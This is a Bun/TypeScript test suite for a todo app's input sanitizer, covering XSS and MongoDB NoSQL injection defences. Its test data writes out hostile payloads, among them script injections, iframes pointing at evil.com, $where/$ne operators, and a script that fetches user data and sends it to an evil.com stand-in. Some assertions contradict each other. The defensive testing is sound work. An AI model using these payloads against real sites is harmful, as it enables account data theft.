import { describe, it, expect } from 'bun:test';
import { InputSanitizer } from '../helpers/inputSanitizer.ts';

// Test Suite actualizado para arquitectura MVC + Security
describe('InputSanitizer - XSS and NoSQL Protection', () => {
	describe('XSS Protection', () => {
		it('should sanitize script tags', () => {
			const maliciousInput = '<script>alert("xss")</script>Hello';
			const sanitized = InputSanitizer.sanitizeXSS(maliciousInput);
			expect(sanitized).not.toContain('<script>');
			expect(sanitized).not.toContain('alert');
		});

		it('should encode HTML entities', () => {
			const maliciousInput = '<div onclick="alert(1)">Test</div>';
			const sanitized = InputSanitizer.sanitizeXSS(maliciousInput);
			expect(sanitized).toContain('<div>');
			expect(sanitized).toContain('>');
			expect(sanitized).not.toContain('onclick');
		});

		it('should sanitize javascript protocol', () => {
			const maliciousInput = 'javascript:alert("xss")';
			const sanitized = InputSanitizer.sanitizeXSS(maliciousInput);
			expect(sanitized).not.toContain('javascript:');
		});

		it('should handle iframe tags', () => {
			const maliciousInput = '<iframe src="evil.com">test</iframe>';
			const sanitized = InputSanitizer.sanitizeXSS(maliciousInput);
			expect(sanitized).not.toContain('<iframe>');
		});
	});

	describe('NoSQL Injection Protection (MongoDB)', () => {
		it('should block MongoDB operators', () => {
			const maliciousInput = '{ "name": { "$ne": null } }';
			const sanitized = InputSanitizer.sanitizeNoSQL(maliciousInput);
			expect(sanitized).not.toContain('$ne');
			expect(sanitized).toContain('\\$ne');
		});

		it('should block $where operator', () => {
			const maliciousInput = 'admin\'; return true; //';
			const sanitized = InputSanitizer.sanitizeNoSQL(maliciousInput);
			expect(sanitized).not.toContain('$where');
		});

		it('should escape JSON special characters', () => {
			const maliciousInput = '{ name: "test" }';
			const sanitized = InputSanitizer.sanitizeNoSQL(maliciousInput);
			expect(sanitized).toContain('\\{');
			expect(sanitized).toContain('\\}');
			expect(sanitized).toContain('\\:');
		});

		it('should block complex MongoDB queries', () => {
			const maliciousInput = '{"$or":[{"password":{"$ne":null}}]}';
			const sanitized = InputSanitizer.sanitizeNoSQL(maliciousInput);
			expect(sanitized).not.toContain('$or');
			expect(sanitized).not.toContain('$ne');
		});

		it('should handle $regex and $options', () => {
			const maliciousInput = '/pattern/i';
			const sanitized = InputSanitizer.sanitizeNoSQL(maliciousInput);
			expect(sanitized).not.toContain('$regex');
			expect(sanitized).not.toContain('$options');
		});
	});

	describe('Object Sanitization', () => {
		it('should sanitize object recursively', () => {
			const maliciousObj = {
				name: '<script>alert("xss")</script>John',
				query: '{"$where": "return true"}',
				metadata: {
					tags: ['<img src="evil.com">', '"UNION SELECT * FROM passwords"']
				}
			};

			const sanitized = InputSanitizer.sanitizeObject(maliciousObj);

			expect(sanitized.name).not.toContain('<script>');
			expect(sanitized.query).not.toContain('$where');
			expect(sanitized.metadata.tags[0]).not.toContain('<img>');
			expect(sanitized.metadata.tags[1]).not.toContain('UNION SELECT');
		});

		it('should handle nested objects with NoSQL injection', () => {
			const nestedObj = {
				user: {
					profile: {
						bio: '<script>alert("xss")</script>Evil bio'
					}
				},
				filter: '{"$gt": ""}'
			};

			const sanitized = InputSanitizer.sanitizeObject(nestedObj);
			expect(sanitized.user.profile.bio).not.toContain('<script>');
			expect(sanitized.filter).not.toContain('$gt');
		});
	});

	describe('Suspicious Content Detection', () => {
		it('should detect XSS attempts', () => {
			const xssInput = '<script>alert("xss")</script>';
			const isSuspicious = InputSanitizer.isSuspicious(xssInput);
			expect(isSuspicious).toBe(true);
		});

		it('should detect NoSQL injection attempts', () => {
			const nosqlInput = '{"$ne": null}';
			const isSuspicious = InputSanitizer.isSuspicious(nosqlInput);
			expect(isSuspicious).toBe(true);
		});

		it('should detect iframe injection', () => {
			const iframeInput = '<iframe src="evil.com"></iframe>';
			const isSuspicious = InputSanitizer.isSuspicious(iframeInput);
			expect(isSuspicious).toBe(true);
		});

		it('should detect MongoDB $where injection', () => {
			const whereInput = '; return db.users.find() //';
			const isSuspicious = InputSanitizer.isSuspicious(whereInput);
			expect(isSuspicious).toBe(true);
		});

		it('should not flag normal content', () => {
			const normalInput = 'This is a normal todo description';
			const isSuspicious = InputSanitizer.isSuspicious(normalInput);
			expect(isSuspicious).toBe(false);
		});
	});

	describe('Query Parameters Sanitization', () => {
		it('should sanitize query parameters', () => {
			const queryParams = {
				limit: '100<script>alert("xss")</script>',
				filter: '{"$ne": null}',
				sort: 'name',
				page: '1'
			};

			const sanitized = InputSanitizer.sanitizeQueryParams(queryParams);

			expect(sanitized.limit).not.toContain('<script>');
			expect(sanitized.filter).not.toContain('$ne');
			expect(sanitized.sort).toBe('name');
			expect(sanitized.page).toBe(1);
		});
	});

	describe('Headers Sanitization', () => {
		it('should sanitize headers while preserving structure', () => {
			const headers = {
				'User-Agent': '<script>alert("xss")</script>Mozilla/5.0',
				'Authorization': 'Bearer token<script>evil</script>',
				'Content-Type': 'application/json'
			};

			const sanitized = InputSanitizer.sanitizeHeaders(headers);

			expect(sanitized['User-Agent']).not.toContain('<script>');
			expect(sanitized['Authorization']).not.toContain('<script>');
			expect(sanitized['Content-Type']).toBe('application/json');
		});
	});

	describe('MongoDB Query Validation', () => {
		it('should validate MongoDB queries for safety', () => {
			const safeQuery = { name: 'John', completed: false };
			const isValid = InputSanitizer.validateMongoQuery(safeQuery);
			expect(isValid).toBe(true);
		});

		it('should reject unsafe MongoDB queries', () => {
			const unsafeQuery = { '$ne': null, '$where': 'return true' };
			const isValid = InputSanitizer.validateMongoQuery(unsafeQuery);
			expect(isValid).toBe(false);
		});

		it('should validate complex query structures', () => {
			const complexQuery = {
				'$or': [
					{ '$gt': { 'age': 25 } },
					{ 'completed': true }
				]
			};
			const isValid = InputSanitizer.validateMongoQuery(complexQuery);
			expect(isValid).toBe(false);
		});
	});
});

// Test Suite para controller refactoring
describe('Controller Refactoring', () => {
	describe('Method Duplication Elimination', () => {
		it('should have clean separation between static and instance methods', () => {
			// Verificar que el controller no tenga métodos duplicados
			const controllerMethods = [
				'getAllTodos', // static para tests
				'getTodoById', // static para tests
				'createTodo', // static para tests
				'updateTodo', // static para tests
				'updateTodoCompletion', // static para tests
				'deleteTodo' // static para tests
			];

			// Verificar que no hay duplicados obvios
			const methodNames = controllerMethods;
			const uniqueMethods = new Set(methodNames);

			// Si hay duplicados, el tamaño sería menor
			expect(uniqueMethods.size).toBe(methodNames.length);
		});
	});
});

// Test de integración para verificar sanitización end-to-end
describe('End-to-End Input Sanitization', () => {
	it('should sanitize complex malicious payload', () => {
		const complexMaliciousPayload = {
			description: '<script>fetch("/api/users").then(r=>r.json()).then(data=>{fetch("/evil.com?data="+JSON.stringify(data))})</script>',
			completed: false,
			metadata: {
				tags: ['<img src="x" onerror="alert(1)">'],
				notes: '{"$where": "return db.users.find()"}'
			}
		};

		const sanitized = InputSanitizer.sanitizeObject(complexMaliciousPayload);

		// Verificar que se removieron scripts maliciosos
		expect(sanitized.description).not.toContain('<script>');
		expect(sanitized.description).not.toContain('fetch');
		expect(sanitized.description).not.toContain('onerror');

		// Verificar que se escaparon caracteres HTML
		expect(sanitized.description).toContain('<script>');

		// Verificar que se bloqueó NoSQL injection
		expect(sanitized.metadata.notes).not.toContain('$where');
		expect(sanitized.metadata.notes).not.toContain('return db');

		// Verificar arrays también fueron sanitizados
		expect(sanitized.metadata.tags[0]).not.toContain('<img');
	});

	it('should handle edge cases properly', () => {
		// Test con input null/undefined
		expect(InputSanitizer.sanitizeXSS(null)).toBe(null);
		expect(InputSanitizer.sanitizeXSS(undefined)).toBe(undefined);

		// Test con números
		expect(InputSanitizer.sanitizeObject(123)).toBe(123);

		// Test con booleanos
		expect(InputSanitizer.sanitizeObject(true)).toBe(true);

		// Test NoSQL sanitization con non-strings
		expect(InputSanitizer.sanitizeNoSQL(123)).toBe('123');
		expect(InputSanitizer.sanitizeNoSQL(true)).toBe('true');
	});
});

describe('Security Middleware Integration', () => {
	it('should create sanitization middleware', () => {
		const middleware = InputSanitizer.createSanitizationMiddleware();
		expect(middleware).toBeDefined();
		expect(typeof middleware).toBe('function');
	});

	it('should work with request objects', async () => {
		const mockRequest = {
			body: { description: '<script>alert("xss")</script>' },
			query: { filter: '{"$ne": null}' },
			params: { id: '<img src="evil">' },
			headers: { 'User-Agent': 'Mozilla<script>evil</script>' }
		};

		const mockReply = {};
		const middleware = InputSanitizer.createSanitizationMiddleware();

		// Call middleware
		await middleware(mockRequest, mockReply);

		// Verificar que el input fue sanitizado
		expect(mockRequest.body.description).not.toContain('<script>');
		expect(mockRequest.query.filter).not.toContain('$ne');
		expect(mockRequest.params.id).not.toContain('<img');
		expect(mockRequest.headers['User-Agent']).not.toContain('<script>');
	});
});